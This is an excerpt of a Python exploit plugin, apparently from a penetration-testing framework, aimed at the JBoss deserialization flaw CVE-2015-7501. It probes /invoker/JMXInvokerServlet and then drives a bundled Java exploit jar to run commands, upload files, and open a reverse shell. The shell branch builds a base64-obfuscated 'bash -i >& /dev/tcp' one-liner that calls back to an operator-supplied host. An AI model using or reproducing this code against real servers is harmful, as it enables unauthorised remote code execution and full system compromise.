...
try:
    import frozen_dir
    SETUP_DIR = frozen_dir.app_path() + "\Plugins\Vuln_Plugins\Jboss\jboss_cve.jar"
except:
    #单文件执行调用当前目录文件
    SETUP_DIR = 'jboss_cve.jar'


def vuln_info():
    info={
        'vuln_name': 'CVE-2015-7501',  #漏洞名称
...
def do_poc(url,hostname,port,scheme,heads={},func_out=print,plugins_temp_data={}):
    ...
    #Error_Info无论何时都会输出
        ...
        status = requests.post(url+"/invoker/JMXInvokerServlet", headers=heads, verify=False)
        status = status.status_code
        if status == 200:
            result['Result'] =True
            result['Result_Info']= "/invoker/JMXInvokerServlet"
        return result
...
def do_exp(url,hostname,port,scheme,heads={},exp_data={},func_out=print,plugins_temp_data={}):
    ...
    #Error_Info无论何时都会输出
        ...
        if exp_data['type']=='cmd':
            popen = subprocess.Popen(['java', '-cp', SETUP_DIR,'com.jboss.main.main2', url, exp_data['command']], stdout=subprocess.PIPE)
        ...
        if exp_data['type']=='shell':
                reverse_ip = exp_data['reverse_ip']
                reverse_port = exp_data['reverse_port']
                cmd = "bash -i >& /dev/tcp/" + reverse_ip + "/" + reverse_port + " 0>&1"
                cmd =  cmd.encode()
                cmd = base64.b64encode(cmd)
                cmd = cmd.decode()
                cmd = "bash -c {echo," + cmd + "}|{base64,-d}|{bash,-i}"
                print("command   "  +  cmd)
                subprocess.Popen(['java', '-cp', SETUP_DIR,'com.jboss.main.main2', url, cmd])
                result['Result_Info'] = "反弹成功"
        #上传文件    
        if exp_data['type']=='uploadfile':
            popen = subprocess.Popen(['java', '-cp', SETUP_DIR,'com.jboss.main.mainupload2', url, exp_data['filename'],base64.b64encode(exp_data['filename_contents'])], stdout=subprocess.PIPE)
            echo = popen.stdout.read().decode()
            if "success" in echo:
                result['Result'] = True
